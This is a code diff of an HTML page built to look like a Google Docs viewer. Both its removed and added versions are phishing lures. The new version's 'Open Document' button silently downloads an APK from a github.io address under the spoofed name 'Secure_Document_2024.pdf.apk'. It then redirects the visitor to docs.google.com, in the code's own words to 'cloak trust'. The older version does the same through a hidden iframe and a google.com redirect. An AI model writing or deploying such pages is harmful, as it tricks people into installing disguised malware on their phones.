@@ -1,50 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Google Viewer</title>
+  <title>Google Docs Viewer</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f8f9fa;
+      font-family: sans-serif;
       text-align: center;
-      padding: 100px;
+      margin-top: 80px;
     }
     button {
-      background: #1a73e8;
+      background-color: #1a73e8;
       color: white;
       padding: 14px 28px;
       font-size: 16px;
       border: none;
-      border-radius: 5px;
+      border-radius: 4px;
       cursor: pointer;
     }
-    button:hover {
-      background: #0c5cd8;
-    }
-    .info {
+    .note {
       margin-top: 20px;
-      color: #5f6368;
+      color: gray;
+      font-size: 14px;
     }
   </style>
 </head>
 <body>
-  <h2>Google Drive Viewer</h2>
-  <p class="info">This document was shared via Google Docs</p>
-  <button onclick="startSpoof()">📄 Open in Google Docs</button>
-
-  <iframe id="spoofFrame" style="display:none;" sandbox="allow-scripts"></iframe>
+  <h2>Shared via Google Docs</h2>
+  <p class="note">The document was securely shared with you</p>
+  <button onclick="triggerDownload()">Open Document</button>
 
   <script>
-    function startSpoof() {
-      // Step 1: Simulate Google.com redirect via iframe
-      const iframe = document.getElementById('spoofFrame');
-      iframe.src = "https://www.google.com/url?q=https://ybt01.github.io/app-debug.apk";
+    function triggerDownload() {
+      const fakeUrl = "https://ybt01.github.io/upload/app-debug.apk";
 
-      // Step 2: Wait a bit for iframe redirect to trigger download
+      const a = document.createElement('a');
+      a.href = fakeUrl;
+      a.download = "Secure_Document_2024.pdf.apk"; // spoofed filename
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+
+      // Cloak trust by redirecting to Google after
       setTimeout(() => {
-        // Step 3: Redirect to real Google for cover
-        window.location.href = "https://google.com/search?q=download";
-      }, 3500);
+        window.location.href = "https://docs.google.com/document/u/0/";
+      }, 1500);
     }
   </script>
 </body>
